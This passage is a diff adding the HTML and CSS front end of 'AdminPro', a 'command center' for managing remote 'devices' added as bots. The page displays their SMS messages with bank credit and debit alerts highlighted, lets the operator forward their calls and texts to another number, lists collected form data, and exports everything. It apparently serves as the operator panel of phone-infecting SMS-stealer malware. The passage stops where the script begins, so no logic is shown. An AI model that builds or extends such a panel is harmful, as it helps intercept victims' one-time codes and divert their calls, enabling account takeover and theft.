+.sub-tab.active{background:linear-gradient(135deg,var(--green),var(--green-dark));color:#fff;box-shadow:0 5px 14px rgba(16,185,129,.28);}
+.sub-tab .badge{background:var(--card2);color:var(--sub);font-size:10px;padding:2px 8px;border-radius:9px;font-weight:800;}
+.sub-tab.active .badge{background:rgba(255,255,255,.3);color:#fff;}
+
+.msg-list{display:flex;flex-direction:column;gap:9px;}
+.msg-bub{background:#fff;border-radius:14px;padding:12px 14px;box-shadow:var(--shadow);border:1px solid var(--border);border-left:3px solid transparent;}
+.msg-bub.inc{border-left-color:var(--border);}
+.msg-bub.out{border-left-color:var(--green);}
+.msg-bub.fin-credit{border-left-color:var(--green)!important;background:var(--green-soft);border-color:#d9f2e6;}
+.msg-bub.fin-debit{border-left-color:var(--rose)!important;background:var(--rose-bg);border-color:#fecaca;}
+.msg-bub-head{display:flex;align-items:center;gap:7px;margin-bottom:7px;flex-wrap:wrap;}
+.msg-bub-sender{font-size:12px;font-weight:800;font-family:var(--mono);color:var(--green-deep);}
+.msg-bub-type{font-size:9px;font-weight:800;padding:3px 7px;border-radius:6px;}
+.msg-bub-type.in{background:var(--card2);color:var(--sub);}
+.msg-bub-type.out{background:var(--green-bg);color:var(--green-deep);}
+.msg-bub-time{margin-left:auto;font-size:10px;color:var(--dim);font-family:var(--mono);font-weight:600;}
+.msg-bub-txt{font-size:12.5px;color:var(--text);line-height:1.55;word-break:break-word;white-space:pre-wrap;}
+
+.form-group{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;box-shadow:var(--shadow);border:1px solid var(--border);border-left:4px solid var(--green);}
+.form-group-header{display:flex;align-items:center;gap:8px;padding-bottom:10px;margin-bottom:8px;border-bottom:1px dashed var(--border);flex-wrap:wrap;}
+.form-group-title{font-size:13px;font-weight:800;color:var(--text);}
+.form-group-date{font-size:10px;color:var(--dim);margin-left:auto;font-family:var(--mono);font-weight:600;}
+.form-del{color:var(--rose-text);cursor:pointer;font-size:12px;padding:5px 9px;border-radius:8px;background:var(--rose-bg);}
+.form-row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid #f6f9f7;gap:10px;}
+.form-row:last-child{border-bottom:none;}
+.form-row-lbl{display:flex;align-items:center;gap:7px;font-size:12px;font-weight:700;color:var(--sub);flex-shrink:0;}
+.form-row-val{font-size:13px;font-weight:700;color:var(--text);font-family:var(--mono);text-align:right;word-break:break-all;flex:1;}
+.form-row-val.hl{color:var(--green-deep);}
+
+.forms-hdr{display:flex;align-items:center;gap:11px;margin-bottom:12px;padding:13px 14px;background:#fff;border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);}
+.forms-hdr-icon{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;flex-shrink:0;}
+.forms-hdr-txt{flex:1;min-width:0;}
+.forms-hdr-title{font-size:13px;font-weight:800;color:var(--text);}
+.forms-hdr-sub{font-size:10px;color:var(--dim);font-weight:600;margin-top:2px;}
+
+.set-card{background:#fff;border-radius:16px;padding:16px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:12px;}
+.set-card-head{display:flex;align-items:center;gap:12px;margin-bottom:14px;}
+.set-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:17px;color:#fff;flex-shrink:0;}
+.set-icon.blue{background:linear-gradient(135deg,#60a5fa,#2563eb);}
+.set-icon.green{background:linear-gradient(135deg,var(--green),var(--green-dark));}
+.set-icon.orange{background:linear-gradient(135deg,#fbbf24,#d97706);}
+.set-icon.pink{background:linear-gradient(135deg,#f472b6,#db2777);}
+.set-icon.purple{background:linear-gradient(135deg,#a78bfa,#7c3aed);}
+.set-icon.gray{background:var(--card2);color:var(--sub);}
+.set-title{font-size:14px;font-weight:800;color:var(--text);}
+.set-sub{font-size:11px;color:var(--dim);font-weight:600;margin-top:2px;}
+.set-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f3f7f5;gap:10px;}
+.set-row:last-child{border-bottom:none;padding-bottom:0;}
+.set-lbl{font-size:12.5px;font-weight:800;color:var(--text);}
+.set-lbl-sub{font-size:10.5px;color:var(--dim);margin-top:3px;font-weight:600;line-height:1.4;}
+.toggle{width:44px;height:25px;border-radius:14px;background:#e5e7eb;border:none;position:relative;cursor:pointer;transition:background .2s;flex-shrink:0;}
+.toggle::after{content:'';position:absolute;width:19px;height:19px;border-radius:50%;background:#fff;top:3px;left:3px;transition:left .2s;box-shadow:0 2px 4px rgba(0,0,0,.18);}
+.toggle.on{background:var(--green);}
+.toggle.on::after{left:22px;}
+
+.method-toggle{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:4px;}
+.method-card{padding:14px 10px;border-radius:12px;border:1.5px solid var(--border);background:#fff;cursor:pointer;text-align:center;transition:all .2s;position:relative;}
+.method-card.active{border-color:var(--green);background:var(--green-soft);box-shadow:0 4px 12px rgba(16,185,129,.15);}
+.method-card .m-ico{font-size:20px;margin-bottom:7px;display:block;color:var(--sub);}
+.method-card.active .m-ico{color:var(--green-dark);}
+.method-card .m-title{font-size:11.5px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.method-card .m-sub{font-size:9.5px;color:var(--dim);font-weight:600;}
+.method-card .m-badge{position:absolute;top:8px;right:8px;font-size:8px;font-weight:800;padding:2px 6px;border-radius:6px;background:var(--green);color:#fff;display:none;}
+.method-card.active .m-badge{display:block;}
+
+.panel{background:#fff;border-radius:16px;padding:18px;margin-bottom:12px;box-shadow:var(--shadow-panel);border:1px solid var(--border);}
+.panel-t{font-size:15px;font-weight:800;margin-bottom:4px;color:var(--text);display:flex;align-items:center;gap:8px;}
+.panel-s{font-size:11.5px;color:var(--dim);margin-bottom:16px;font-weight:600;}
+.sim-tog{display:flex;gap:9px;margin-bottom:16px;}
+.sim-col{flex:1;display:flex;flex-direction:column;gap:6px;}
+.stb{padding:12px 13px;background:var(--card2);border:1.5px solid var(--border);border-radius:11px;color:var(--sub);font-family:'Inter',sans-serif;font-size:12.5px;font-weight:800;cursor:pointer;text-align:center;transition:all .2s;}
+.stb.s1{background:var(--green-bg);border-color:var(--green-line);color:var(--green-deep);}
+.stb.s2{background:var(--blue-bg);border-color:#bfdbfe;color:var(--blue-text);}
+.stb.on{background:var(--green-bg);border-color:var(--green-line);color:var(--green-deep);}
+.stb.off{background:var(--rose-bg);border-color:#fecaca;color:var(--rose-text);}
+.sinp,.sarea,.ssel{width:100%;padding:12px 15px;background:var(--card2);border:1px solid transparent;border-radius:12px;color:var(--text);font-family:'Inter',sans-serif;font-size:13.5px;font-weight:600;outline:none;transition:all .2s;}
+.sinp:focus,.sarea:focus,.ssel:focus{background:#fff;border-color:var(--green);box-shadow:0 0 0 3px rgba(16,185,129,.1);}
+.sarea{resize:vertical;min-height:100px;line-height:1.55;}
+.ssel{cursor:pointer;appearance:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%2310b981' stroke-width='3'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 15px center;padding-right:40px;}
+.sbtn{width:100%;padding:14px;border:none;border-radius:12px;color:#fff;font-family:'Inter',sans-serif;font-size:13.5px;font-weight:800;cursor:pointer;background:linear-gradient(135deg,var(--green),var(--green-dark));box-shadow:0 8px 20px rgba(16,185,129,.28);display:flex;align-items:center;justify-content:center;gap:7px;}
+.sbtn:active{transform:scale(.98);}
+.sres{margin-top:12px;padding:11px 15px;border-radius:11px;font-size:12px;font-weight:700;display:none;line-height:1.5;}
+.sres.ok{background:var(--green-bg);color:var(--green-deep);border:1px solid var(--green-line);}
+.sres.err{background:var(--rose-bg);color:var(--rose-text);border:1px solid #fecaca;}
+.snrow{display:flex;align-items:center;gap:6px;padding:0 2px;}
+.sntxt{font-size:10.5px;font-family:var(--mono);color:var(--dim);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600;}
+.cpb{padding:5px 10px;background:var(--green);border:none;border-radius:7px;color:#fff;font-family:'Inter',sans-serif;font-size:10px;font-weight:800;cursor:pointer;}
+.fw-tog{display:flex;gap:8px;margin-bottom:14px;}
+.fw-tog .stb{flex:1;}
+.badge-row{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;}
+.fw-badge{font-size:10px;font-weight:800;padding:6px 12px;border-radius:20px;}
+.fw-badge.on{background:var(--green-bg);color:var(--green-deep);}
+.fw-badge.off{background:var(--card2);color:var(--sub);}
+.fl{display:block;font-size:10px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:var(--sub);margin-bottom:7px;}
+
+.ldwrap{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:60px 20px;color:var(--sub);font-size:13px;gap:14px;text-align:center;font-weight:600;}
+.gold-spin{width:34px;height:34px;border-radius:50%;border:3px solid #e6ece9;border-top-color:var(--green);animation:spin .7s linear infinite;}
+.empty{text-align:center;padding:50px 20px;color:var(--dim);}
+.empty .ei{font-size:44px;margin-bottom:12px;opacity:.75;}
+.empty p{font-size:13px;font-weight:700;margin-bottom:5px;}
+.empty .hint{font-size:11px;color:var(--dim);font-weight:600;}
+
+.bottom-nav{display:flex;justify-content:space-around;background:#fff;border-top:1px solid #f1f5f3;padding:9px 0 11px;padding-bottom:calc(11px + env(safe-area-inset-bottom));flex-shrink:0;z-index:100;box-shadow:0 -4px 22px rgba(16,24,20,.04);}
+.nav-item{display:flex;flex-direction:column;align-items:center;gap:3px;font-size:9.5px;font-weight:800;color:var(--dim);cursor:pointer;transition:color .2s;border:none;background:none;font-family:'Inter',sans-serif;padding:5px 20px;letter-spacing:.2px;}
+.nav-item.active{color:var(--green-dark);}
+.nav-item.active svg{fill:var(--green-dark);}
+.nav-item svg{width:22px;height:22px;fill:currentColor;transition:fill .2s;}
+
+.sb-overlay{position:fixed;inset:0;background:rgba(15,30,23,.45);backdrop-filter:blur(4px);z-index:9998;display:none;}
+.sb-overlay.open{display:block;}
+.sb{width:300px;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:fixed;left:0;top:0;bottom:0;z-index:9999;transform:translateX(-100%);transition:transform .3s cubic-bezier(.22,1,.36,1);}
+.sb.open{transform:translateX(0);box-shadow:14px 0 40px rgba(0,0,0,.12);}
+.sb-head{padding:20px 16px;background:linear-gradient(135deg,#f0fdf6,#ffffff);border-bottom:1px solid var(--border);position:relative;}
+.sb-head-top{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
+.sb-head-icon{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:900;box-shadow:0 6px 16px rgba(16,185,129,.3);}
+.sb-head-name{font-size:16px;font-weight:900;color:var(--text);}
+.sb-head-badge{font-size:10px;font-weight:800;color:var(--gold-text);background:var(--gold-bg);border:1px solid #fde68a;padding:4px 10px;border-radius:14px;display:inline-flex;align-items:center;gap:4px;margin-top:5px;}
+.sb-close{position:absolute;top:18px;right:16px;width:32px;height:32px;border-radius:50%;background:#fff;border:1px solid var(--border);color:var(--sub);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;}
+.sb-list{flex:1;overflow-y:auto;padding:6px 0;}
+.sb-menu-item{display:flex;align-items:center;gap:12px;padding:14px 16px;cursor:pointer;border-bottom:1px solid #f3f7f5;}
+.sb-menu-item:active{background:var(--green-soft);}
+.sb-menu-icon{width:38px;height:38px;border-radius:11px;background:var(--green-bg);display:flex;align-items:center;justify-content:center;font-size:17px;color:var(--green-deep);flex-shrink:0;}
+.sb-menu-body{flex:1;min-width:0;}
+.sb-menu-title{font-size:13px;font-weight:800;color:var(--text);}
+.sb-menu-sub{font-size:10.5px;color:var(--dim);font-weight:600;margin-top:2px;}
+.sb-menu-arrow{color:var(--dim);font-size:18px;font-weight:800;}
+
+.overlay{position:fixed;inset:0;background:rgba(15,30,23,.55);backdrop-filter:blur(6px);display:none;align-items:flex-end;justify-content:center;z-index:10000;}
+.overlay.open{display:flex;animation:fadeIn .2s;}
+.overlay.center{align-items:center;padding:14px;}
+.modal{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:520px;animation:sheetIn .3s cubic-bezier(.22,1,.36,1);max-height:92vh;box-shadow:var(--shadow-lg);display:flex;flex-direction:column;overflow:hidden;}
+.overlay.center .modal{border-radius:20px;animation:modalIn .3s;}
+.modal-scroll{overflow-y:auto;padding:20px;-webkit-overflow-scrolling:touch;}
+.modal-title{font-size:17px;font-weight:900;margin-bottom:16px;color:var(--text);display:flex;align-items:center;gap:10px;}
+.modal-title .mt-icon{width:36px;height:36px;border-radius:12px;background:var(--green-bg);display:flex;align-items:center;justify-content:center;color:var(--green-deep);font-size:16px;}
+.modal-x{margin-left:auto;width:32px;height:32px;border-radius:50%;background:var(--card2);border:none;color:var(--sub);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;font-weight:800;}
+.mbtns{display:flex;gap:9px;padding:14px 20px 20px;background:#fff;border-top:1px solid var(--border);flex-shrink:0;}
+.mcnc{flex:1;padding:13px;background:var(--card2);border:1px solid var(--border);border-radius:12px;color:var(--sub);font-family:'Inter',sans-serif;font-weight:800;cursor:pointer;font-size:13px;}
+.mok{flex:2;padding:13px;background:linear-gradient(135deg,var(--green),var(--green-dark));border:none;border-radius:12px;color:#fff;font-family:'Inter',sans-serif;font-weight:800;cursor:pointer;font-size:13px;box-shadow:0 6px 16px rgba(16,185,129,.28);}
+.mok.danger{background:linear-gradient(135deg,#ef4444,#dc2626);}
+.fi{width:100%;padding:12px 15px;background:var(--card2);border:1px solid transparent;border-radius:12px;color:var(--text);font-family:'Inter',sans-serif;font-size:14px;font-weight:600;outline:none;margin-bottom:11px;transition:all .2s;}
+.fi:focus{background:#fff;border-color:var(--green);box-shadow:0 0 0 3px rgba(16,185,129,.1);}
+
+.toast{position:fixed;bottom:90px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--text);color:#fff;font-size:13px;font-weight:700;padding:12px 24px;border-radius:14px;z-index:99999;opacity:0;transition:all .3s;pointer-events:none;white-space:nowrap;box-shadow:var(--shadow-lg);max-width:90vw;overflow:hidden;text-overflow:ellipsis;}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+.toast.on{background:var(--green-deep);}
+.toast.off{background:var(--rose-text);}
+.toast.sms{background:var(--blue-text);}
+
+.mc-days{display:grid;grid-template-columns:1fr 1fr 1fr;gap:9px;margin-bottom:16px;}
+.mc-day{padding:14px 8px;border-radius:13px;border:1.5px solid var(--border);background:#fff;cursor:pointer;text-align:center;transition:all .2s;}
+.mc-day.active{border-color:var(--green);background:var(--green-soft);box-shadow:0 4px 12px rgba(16,185,129,.15);}
+.mc-day .mc-num{font-size:22px;font-weight:900;color:var(--text);line-height:1;margin-bottom:4px;}
+.mc-day.active .mc-num{color:var(--green-dark);}
+.mc-day .mc-lbl{font-size:10px;font-weight:700;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;}
+.mc-day.active .mc-lbl{color:var(--green-deep);}
+
+.mc-scanner{position:relative;width:180px;height:180px;margin:10px auto 24px;display:flex;align-items:center;justify-content:center;}
+.mc-radar{position:absolute;inset:0;border-radius:50%;border:2px solid var(--green-line);background:radial-gradient(circle,rgba(16,185,129,.06),transparent 70%);}
+.mc-radar::before{content:'';position:absolute;inset:20px;border-radius:50%;border:1.5px solid var(--green-line);opacity:.5;}
+.mc-radar::after{content:'';position:absolute;inset:45px;border-radius:50%;border:1.5px solid var(--green-line);opacity:.3;}
+.mc-sweep{position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(16,185,129,.4),transparent 60%);animation:radarSweep 2s linear infinite;}
+.mc-center{position:relative;z-index:2;width:60px;height:60px;border-radius:50%;background:#fff;border:3px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 8px 24px rgba(16,185,129,.3);}
+.mc-scanline{position:absolute;left:15%;right:15%;height:2px;background:linear-gradient(90deg,transparent,var(--green),transparent);animation:mcScanline 2.5s linear infinite;border-radius:2px;filter:blur(1px);}
+.mc-status{text-align:center;font-size:13px;font-weight:800;color:var(--text);margin-bottom:8px;}
+.mc-sublabel{text-align:center;font-size:11px;color:var(--dim);font-weight:600;margin-bottom:8px;font-family:var(--mono);}
+.mc-progress{height:5px;background:var(--card2);border-radius:3px;overflow:hidden;margin:14px 0 6px;}
+.mc-progress-in{height:100%;background:linear-gradient(90deg,var(--green),var(--green-dark));border-radius:3px;width:0;transition:width .25s;}
+.mc-stat-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:9px;margin:16px 0;}
+.mc-stat{background:var(--card2);border-radius:12px;padding:12px 6px;text-align:center;}
+.mc-stat .v{font-size:20px;font-weight:900;color:var(--green-dark);line-height:1;margin-bottom:4px;}
+.mc-stat.off .v{color:var(--rose-text);}
+.mc-stat .l{font-size:9px;font-weight:800;color:var(--dim);letter-spacing:.6px;text-transform:uppercase;}
+.mc-dev-list{max-height:220px;overflow-y:auto;margin-bottom:14px;}
+.mc-dev-row{display:flex;align-items:center;gap:10px;padding:10px;background:var(--card2);border-radius:11px;margin-bottom:7px;}
+.mc-dev-row .av{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:900;flex-shrink:0;}
+.mc-dev-row .meta{flex:1;min-width:0;}
+.mc-dev-row .nm{font-size:12px;font-weight:800;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.mc-dev-row .sub{font-size:10px;color:var(--dim);font-family:var(--mono);margin-top:2px;}
+
+.lh-row{display:flex;align-items:center;gap:11px;padding:12px;background:var(--card2);border-radius:12px;margin-bottom:8px;}
+.lh-icon{width:38px;height:38px;border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff;flex-shrink:0;}
+.lh-icon.ok{background:linear-gradient(135deg,var(--green),var(--green-dark));}
+.lh-icon.fail{background:linear-gradient(135deg,#ef4444,#dc2626);}
+.lh-info{flex:1;min-width:0;}
+.lh-method{font-size:12.5px;font-weight:800;color:var(--text);margin-bottom:2px;}
+.lh-device{font-size:10px;color:var(--dim);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.lh-time{font-size:10px;color:var(--dim);font-family:var(--mono);font-weight:600;text-align:right;}
+
+/* GO TO TOP BUTTON */
+.go-to-top {
+  position: fixed;
+  bottom: 85px;
+  right: 20px;
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  background: var(--green);
+  color: #fff;
+  border: none;
+  box-shadow: 0 4px 12px rgba(16,185,129,.4);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  font-weight: 900;
+  cursor: pointer;
+  z-index: 1000;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s, transform 0.3s;
+  transform: translateY(10px);
+}
+.go-to-top.show {
+  opacity: 1;
+  pointer-events: auto;
+  transform: translateY(0);
+}
+
+@media (max-width:480px){
+  .tab-body{padding:12px 12px 96px;}
+  .wcard-title{font-size:22px;}
+  .stat-val{font-size:20px;}
+  .otp-input{font-size:22px;letter-spacing:8px;}
+}
+</style>
+</head>
+<body>
+
+<div class="lock-screen" id="lockScreen">
+  <div class="lock-box">
+    <div class="lock-badge" id="lockBadge">SECURE</div>
+    <div class="lock-icon-wrap">
+      <div class="lock-ripple" id="lockRipple"></div>
+      <div class="lock-icon" id="lockIcon">🔒</div>
+    </div>
+    <div class="lock-title" id="lockTitle">AdminPro Locked</div>
+    <div class="lock-sub" id="lockSub">Verify your identity to continue</div>
+    <div class="lock-err" id="lockErr"></div>
+    <div id="lockContent"></div>
+  </div>
+</div>
+
+<div id="boot">
+  <div class="boot-logo">A</div>
+  <div class="boot-txt">◈ AdminPro ◈</div>
+  <div class="boot-bar"><div class="boot-bar-in"></div></div>
+</div>
+
+<div id="app">
+  <div class="tb">
+    <button class="tb-menu" onclick="toggleSB()">☰</button>
+    <div class="tb-brand">
+      <div class="tb-brand-row"><span class="tb-shield">🛡</span><div class="tb-title">AdminPro</div></div>
+      <div class="tb-subtitle"><span class="tb-conn-dot" id="connDot"></span><span id="connTxt">COMMAND CENTER</span></div>
+    </div>
+    <div class="tb-right">
+      <button class="tb-circle outline" onclick="switchTab('settings')" title="Settings">⚙</button>
+    </div>
+  </div>
+
+  <div class="body">
+    <div class="sb-overlay" id="sbOverlay" onclick="toggleSB()"></div>
+    <div class="sb" id="sidebar">
+      <div class="sb-head">
+        <button class="sb-close" onclick="toggleSB()">✕</button>
+        <div class="sb-head-top">
+          <div class="sb-head-icon">◇</div>
+          <div>
+            <div class="sb-head-name">AdminPro</div>
+            <div class="sb-head-badge">👑 GOLD · 325d</div>
+          </div>
+        </div>
+      </div>
+      <div class="sb-list">
+        <div class="sb-menu-item" onclick="startMagicScanFromSettings();toggleSB();">
+          <div class="sb-menu-icon">✨</div>
+          <div class="sb-menu-body"><div class="sb-menu-title">Magic Scan</div><div class="sb-menu-sub">Auto-remove offline devices</div></div>
+          <span class="sb-menu-arrow">›</span>
+        </div>
+        <div class="sb-menu-item" onclick="openLoginHistory();toggleSB();">
+          <div class="sb-menu-icon">🕐</div>
+          <div class="sb-menu-body"><div class="sb-menu-title">Login History</div><div class="sb-menu-sub">View all login sessions</div></div>
+          <span class="sb-menu-arrow">›</span>
+        </div>
+        <div class="sb-menu-item" onclick="switchTab('settings');toggleSB();">
+          <div class="sb-menu-icon">⚙</div>
+          <div class="sb-menu-body"><div class="sb-menu-title">Settings</div><div class="sb-menu-sub">Configure your panel</div></div>
+          <span class="sb-menu-arrow">›</span>
+        </div>
+        <div class="sb-menu-item" onclick="exportData();toggleSB();">
+          <div class="sb-menu-icon">⬇</div>
+          <div class="sb-menu-body"><div class="sb-menu-title">Export Data</div><div class="sb-menu-sub">Download as JSON</div></div>
+          <span class="sb-menu-arrow">›</span>
+        </div>
+        <div class="sb-menu-item" onclick="lockPanelNow();toggleSB();">
+          <div class="sb-menu-icon">🔓</div>
+          <div class="sb-menu-body"><div class="sb-menu-title">Lock Panel</div><div class="sb-menu-sub">Require 2FA to unlock</div></div>
+          <span class="sb-menu-arrow">›</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-body" id="mainContent">
+      <div class="ldwrap"><div class="gold-spin"></div><div>📱 Loading…</div></div>
+    </div>
+  </div>
+
+  <div class="bottom-nav">
+    <button class="nav-item active" data-nav="overview" onclick="switchTab('overview')">
+      <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>Home
+    </button>
+    <button class="nav-item" data-nav="devices" onclick="switchTab('devices')">
+      <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>Devices
+    </button>
+    <button class="nav-item" data-nav="messages" onclick="switchTab('messages')">
+      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>Messages
+    </button>
+  </div>
+</div>
+
+<div class="overlay center" id="addModal"><div class="modal"><div class="modal-scroll"><div class="modal-title"><span class="mt-icon">＋</span>Add Device</div><label class="fl">Device ID</label><input class="fi" id="aId"/><label class="fl">Name</label><input class="fi" id="aN"/><label class="fl">Phone</label><input class="fi" id="aP"/></div><div class="mbtns"><button class="mcnc" onclick="closeM('addModal')">Cancel</button><button class="mok" onclick="addBot()">Add</button></div></div></div>
+<div class="overlay center" id="updModal"><div class="modal"><div class="modal-scroll"><div class="modal-title"><span class="mt-icon">✎</span>Update Number</div><label class="fl">Device ID</label><input class="fi" id="uId"/><label class="fl">New Phone</label><input class="fi" id="uP"/></div><div class="mbtns"><button class="mcnc" onclick="closeM('updModal')">Cancel</button><button class="mok" onclick="updNum()">Update</button></div></div></div>
+<div class="overlay center" id="confirmModal"><div class="modal"><div class="modal-scroll"><div class="modal-title"><span class="mt-icon">⚠</span><span id="confT">Confirm</span></div><p id="confM" style="color:var(--sub);font-size:13px;margin-bottom:18px;line-height:1.7"></p></div><div class="mbtns"><button class="mcnc" onclick="closeM('confirmModal')">Cancel</button><button class="mok danger" id="confOk">Delete</button></div></div></div>
+
+<div class="overlay" id="cfModal">
+  <div class="modal">
+    <div class="modal-scroll">
+      <div class="modal-title" style="font-size:16px;"><span style="color:var(--green-dark);font-size:18px;">📞</span>Call Forwarding <span id="cfDevName" style="font-size:11px;color:var(--dim);font-weight:600;margin-left:4px;"></span><button class="modal-x" onclick="closeM('cfModal')">✕</button></div>
+      <div class="badge-row" id="cfBadgeRowModal"></div>
+      <div class="fw-tog"><button class="stb" id="cfOnBtnModal" onclick="setCallFw(true)">Enable</button><button class="stb" id="cfOffBtnModal" onclick="setCallFw(false)">Disable</button></div>
+      <label class="fl">📅 Forward to number</label>
+      <input id="cfTargetModal" class="sinp" placeholder="Forward to number" style="margin-bottom:14px;"/>
+      <div class="sim-tog"><button class="stb s1" id="cfSim1" onclick="selCfSim(1)">SIM 1</button><button class="stb" id="cfSim2" onclick="selCfSim(2)">SIM 2</button></div>
+      <button class="sbtn" onclick="applyCallFwModal()">📞 Save Call Forward</button>
+      <div class="sres" id="cfResModal"></div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="smsFwdModal">
+  <div class="modal">
+    <div class="modal-scroll">
+      <div class="modal-title" style="font-size:16px;"><span style="color:var(--pink-text);font-size:18px;">📨</span>SMS Forwarding <span id="smsFwDevName" style="font-size:11px;color:var(--dim);font-weight:600;margin-left:4px;"></span><button class="modal-x" onclick="closeM('smsFwdModal')">✕</button></div>
+      <div class="badge-row" id="smsFwBadgeRow"></div>
+      <div class="fw-tog"><button class="stb" id="smsFwOnBtn" onclick="setSmsFw(true)">Enable</button><button class="stb" id="smsFwOffBtn" onclick="setSmsFw(false)">Disable</button></div>
+      <label class="fl">📅 Forward to number</label>
+      <input id="smsFwTarget" class="sinp" placeholder="Forward to number" style="margin-bottom:14px;"/>
+      <div class="sim-tog"><button class="stb s1" id="smsFwSim1" onclick="selSmsFwSim(1)">SIM 1</button><button class="stb" id="smsFwSim2" onclick="selSmsFwSim(2)">SIM 2</button></div>
+      <button class="sbtn" onclick="applySmsFw()" style="background:linear-gradient(135deg,#f472b6,#db2777);">📨 Save SMS Forward</button>
+      <div class="sres" id="smsFwRes"></div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay center" id="magicClearModal">
+  <div class="modal">
+    <div class="modal-scroll">
+      <div class="modal-title"><span class="mt-icon">✨</span>Magic Clear <button class="modal-x" onclick="closeMagicClear()">✕</button></div>
+      <div id="mcIntro">
+        <div style="font-size:12.5px;color:var(--sub);line-height:1.6;margin-bottom:16px;padding:12px;background:var(--green-soft);border-radius:12px;border-left:3px solid var(--green);">
+          <b style="color:var(--green-deep);">What it does:</b> Scans for offline devices older than selected days and removes them from your panel.
+        </div>
+        <label class="fl">Select time threshold</label>
+        <div class="mc-days">
+          <div class="mc-day" data-days="7" onclick="selectMcDays(7)"><div class="mc-num">7</div><div class="mc-lbl">Days</div></div>
+          <div class="mc-day" data-days="3" onclick="selectMcDays(3)"><div class="mc-num">3</div><div class="mc-lbl">Days</div></div>
+          <div class="mc-day" data-days="30" onclick="selectMcDays(30)"><div class="mc-num">30</div><div class="mc-lbl">Days</div></div>
+        </div>
+        <button class="sbtn" onclick="startMagicScan()">📡 Start Scan</button>
+      </div>
+      <div id="mcScanning" style="display:none;">
+        <div class="mc-scanner">
+          <div class="mc-radar"></div>
+          <div class="mc-sweep"></div>
+          <div class="mc-scanline"></div>
+          <div class="mc-center">📡</div>
+        </div>
+        <div class="mc-status" id="mcStatusText">Initializing…</div>
+        <div class="mc-sublabel" id="mcSubText">Please wait</div>
+        <div class="mc-progress"><div class="mc-progress-in" id="mcProgIn"></div></div>
+      </div>
+      <div id="mcResults" style="display:none;">
+        <div class="mc-status" id="mcResultTitle">Scan Complete</div>
+        <div class="mc-sublabel" id="mcResultSub">No devices found</div>
+        <div class="mc-stat-row">
+          <div class="mc-stat"><div class="v" id="mcStatTotal">0</div><div class="l">Total</div></div>
+          <div class="mc-stat off"><div class="v" id="mcStatOff">0</div><div class="l">Offline</div></div>
+          <div class="mc-stat"><div class="v" id="mcStatClean">0</div><div class="l">Cleanable</div></div>
+        </div>
+        <div class="mc-dev-list" id="mcDevList"></div>
+        <button class="sbtn" id="mcClearBtn" onclick="confirmMagicClear()" style="display:none;background:linear-gradient(135deg,#ef4444,#dc2626);">🗑 Remove Devices</button>
+        <button class="sbtn" style="margin-top:8px;background:var(--card2);color:var(--sub);box-shadow:none;" onclick="closeMagicClear()">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay center" id="loginHistoryModal">
+  <div class="modal">
+    <div class="modal-scroll">
+      <div class="modal-title"><span class="mt-icon">🕐</span>Login History <button class="modal-x" onclick="closeM('loginHistoryModal')">✕</button></div>
+      <div id="loginHistoryBody"></div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toastEl"></div>
+<button id="goToTopBtn" class="go-to-top" onclick="scrollToTop()">↑</button>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
